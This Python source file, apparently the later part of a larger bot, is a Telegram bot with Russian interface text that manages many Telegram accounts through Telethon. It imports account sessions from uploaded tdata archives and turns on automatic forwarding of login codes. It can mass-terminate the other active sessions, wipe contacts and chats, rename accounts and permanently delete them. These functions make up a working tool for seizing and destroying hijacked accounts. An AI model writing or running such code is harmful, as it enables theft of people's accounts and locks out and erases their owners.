@dp.message(F.text == "🔤 Массово: Юзернейм")
async def mass_username(message: Message, state: FSMContext):
    await state.set_state(EditUsername.base)
    await state.update_data(mass=True)
    await message.answer(
        "🔤 Введи базовый юзернейм (бот найдёт свободный для каждого аккаунта):",
        reply_markup=cancel_kb()
    )

@dp.message(F.text == "🖼 Массово: Аватарка")
async def mass_avatar(message: Message, state: FSMContext):
    await state.set_state(EditAvatar.waiting)
    await state.update_data(mass=True)
    await message.answer("🖼 Отправь фото:", reply_markup=cancel_kb())

@dp.message(F.text == "🚪 Массово: Кик сессий")
async def mass_kick(message: Message, state: FSMContext):
    user_id = message.from_user.id
    accs = get_user_sessions(user_id)
    if not accs:
        await message.answer("❌ Нет аккаунтов.", reply_markup=main_menu_kb())
        return

    await message.answer(f"⏳ Кикаю сессии на {len(accs)} аккаунтах...")
    total = 0
    for idx, acc in accs.items():
        try:
            client = await get_client(acc)
            auths = await client(GetAuthorizationsRequest())
            for auth in auths.authorizations:
                if not auth.current:
                    await client(ResetAuthorizationRequest(hash=auth.hash))
                    total += 1
        except Exception:
            pass
    await message.answer(f"✅ Всего кикнуто сессий: {total}", reply_markup=mass_actions_kb())

@dp.message(F.text == "🧹 Массово: Очистить")
async def mass_clean(message: Message, state: FSMContext):
    user_id = message.from_user.id
    accs = get_user_sessions(user_id)
    if not accs:
        await message.answer("❌ Нет аккаунтов.", reply_markup=main_menu_kb())
        return

    await message.answer(f"⏳ Очищаю {len(accs)} аккаунтов... Это может занять время.")
    for idx, acc in accs.items():
        try:
            client = await get_client(acc)
            try:
                contacts = await client(GetContactsRequest(hash=0))
                if contacts.users:
                    await client(DeleteContactsRequest(id=[u.id for u in contacts.users]))
            except Exception:
                pass

            dialogs = await client.get_dialogs(limit=200)
            for dialog in dialogs:
                try:
                    entity = dialog.entity
                    if hasattr(entity, 'broadcast') and entity.broadcast:
                        await client(LeaveChannelRequest(entity))
                    elif hasattr(entity, 'megagroup') and entity.megagroup:
                        await client(LeaveChannelRequest(entity))
                    else:
                        await client(DeleteHistoryRequest(peer=entity, max_id=0, just_clear=False, revoke=True))
                    await asyncio.sleep(0.3)
                except Exception:
                    pass
        except Exception:
            pass

    await message.answer(f"✅ Все {len(accs)} аккаунтов очищены!", reply_markup=mass_actions_kb())

@dp.message(F.text == "🔙 Назад")
async def go_back(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Главное меню:", reply_markup=main_menu_kb())


# ─── Фоновая задача: keepalive для Telethon-клиентов ─────────────────────────
async def keep_clients_alive():
    """Переподключает упавшие Telethon-клиенты каждые 60 секунд."""
    while True:
        await asyncio.sleep(60)
        for user_id, accs in list(sessions.items()):
            for idx, acc in list(accs.items()):
                client: TelegramClient = acc.get("client")
                if client and not client.is_connected():
                    try:
                        await client.connect()
                        logger.info(f"[Keepalive] переподключён {acc['phone']}")
                    except Exception as e:
                        logger.warning(f"[Keepalive] не удалось переподключить {acc['phone']}: {e}")



# ─── Загрузить tdata ──────────────────────────────────────────────────────────
@dp.message(F.text == "📦 Загрузить tdata")
async def load_tdata_file(message: Message, state: FSMContext):
    await message.answer(
        "📎 Отправь zip-архив с tdata\n"
        "Формат: <code>tdata_номер.zip</code> (внутри должен быть .session файл)",
        reply_markup=cancel_kb(), parse_mode="HTML"
    )
    await state.set_state(SelectAccount.waiting)
    await state.update_data(action="load_tdata_file")

async def handle_tdata_document(message: Message, state: FSMContext):
    data = await state.get_data()
    if data.get("action") != "load_tdata_file":
        return

    if not message.document.file_name.endswith(".zip"):
        await message.answer("❌ Нужен zip-архив с tdata")
        return

    user_id = message.from_user.id
    file = await bot.get_file(message.document.file_id)
    zip_path = f"/tmp/{user_id}_tdata.zip"
    await bot.download_file(file.file_path, zip_path)

    try:
        import zipfile
        session_path = None
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for name in zf.namelist():
                if name.endswith(".session") and "/" not in name:
                    session_path = f"/tmp/{user_id}_{name}"
                    with open(session_path, "wb") as sf:
                        sf.write(zf.read(name))
                    break

        if not session_path:
            raise ValueError("В архиве не найден .session файл")

        session_string = _extract_session_string(session_path)
        client = TelegramClient(StringSession(session_string), config.API_ID, config.API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            raise ValueError("Сессия недействительна — аккаунт не авторизован")

        me = await client.get_me()
        if me is None:
            raise ValueError("Не удалось получить данные аккаунта")

        phone = me.phone or f"id{me.id}"
        if phone and not phone.startswith("+"):
            phone = f"+{phone}"

        if user_id not in sessions:
            sessions[user_id] = {}
        idx = len(sessions[user_id])
        sessions[user_id][idx] = {
            "phone": phone,
            "session_string": session_string,
            "client": client
        }
        attach_code_listener(client, user_id, phone)
        await state.clear()
        await message.answer(
            f"✅ Аккаунт <b>{phone}</b> загружен из tdata!\n"
            f"🔔 Автопересылка кодов <b>включена</b>.",
            reply_markup=main_menu_kb(), parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ Ошибка при загрузке tdata: {e}", reply_markup=main_menu_kb())
        await state.clear()
    finally:
        if zip_path and os.path.exists(zip_path):
            os.remove(zip_path)
        if session_path and os.path.exists(session_path):
            os.remove(session_path)


# ─── Удалить из бота ──────────────────────────────────────────────────────────
@dp.message(F.text == "🗑 Удалить из бота")
async def delete_from_bot(message: Message, state: FSMContext):
    user_id = message.from_user.id
    data = await state.get_data()
    acc = get_selected_account(user_id, data)
    if not acc:
        await message.answer("❌ Аккаунт не найден.", reply_markup=main_menu_kb())
        await state.clear()
        return

    phone = acc["phone"]
    idx = data.get("selected_account")

    try:
        client = acc.get("client")
        if client and client.is_connected():
            await client.disconnect()
    except Exception:
        pass

    sessions[user_id].pop(idx, None)
    # Переиндексируем
    accs = sessions[user_id]
    new_accs = {i: acc for i, acc in enumerate(accs.values())}
    sessions[user_id] = new_accs

    await state.clear()
    await message.answer(
        f"✅ Аккаунт <b>{phone}</b> удалён из бота.",
        reply_markup=main_menu_kb(), parse_mode="HTML"
    )


# ─── Удалить из Telegram ──────────────────────────────────────────────────────
@dp.message(F.text == "☠️ Удалить из Telegram")
async def delete_from_telegram(message: Message, state: FSMContext):
    user_id = message.from_user.id
    data = await state.get_data()
    acc = get_selected_account(user_id, data)
    if not acc:
        await message.answer("❌ Аккаунт не найден.", reply_markup=main_menu_kb())
        await state.clear()
        return

    phone = acc["phone"]
    await message.answer(
        f"⚠️ <b>Внимание!</b> Аккаунт <b>{phone}</b> будет <b>навсегда удалён</b> из Telegram!\n\n"
        f"Для подтверждения напиши: <code>УДАЛИТЬ</code>",
        reply_markup=cancel_kb(), parse_mode="HTML"
    )
    await state.update_data(action="confirm_delete_telegram")


@dp.message(F.text == "УДАЛИТЬ")
async def confirm_delete_telegram(message: Message, state: FSMContext):
    user_id = message.from_user.id
    data = await state.get_data()
    if data.get("action") != "confirm_delete_telegram":
        return

    acc = get_selected_account(user_id, data)
    if not acc:
        await message.answer("❌ Аккаунт не найден.", reply_markup=main_menu_kb())
        await state.clear()
        return

    phone = acc["phone"]
    idx = data.get("selected_account")

    try:
        from telethon.tl.functions.account import DeleteAccountRequest
        client = await get_client(acc)
        await client(DeleteAccountRequest(reason="Deleted by user"))

        # Удаляем из бота
        try:
            if client.is_connected():
                await client.disconnect()
        except Exception:
            pass
        sessions[user_id].pop(idx, None)
        new_accs = {i: a for i, a in enumerate(sessions[user_id].values())}
        sessions[user_id] = new_accs

        await state.clear()
        await message.answer(
            f"✅ Аккаунт <b>{phone}</b> удалён из Telegram.",
            reply_markup=main_menu_kb(), parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ Ошибка при удалении: {e}", reply_markup=account_actions_kb())
        await state.clear()


# ─── Запуск ───────────────────────────────────────────────────────────────────
async def main():
    asyncio.create_task(keep_clients_alive())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
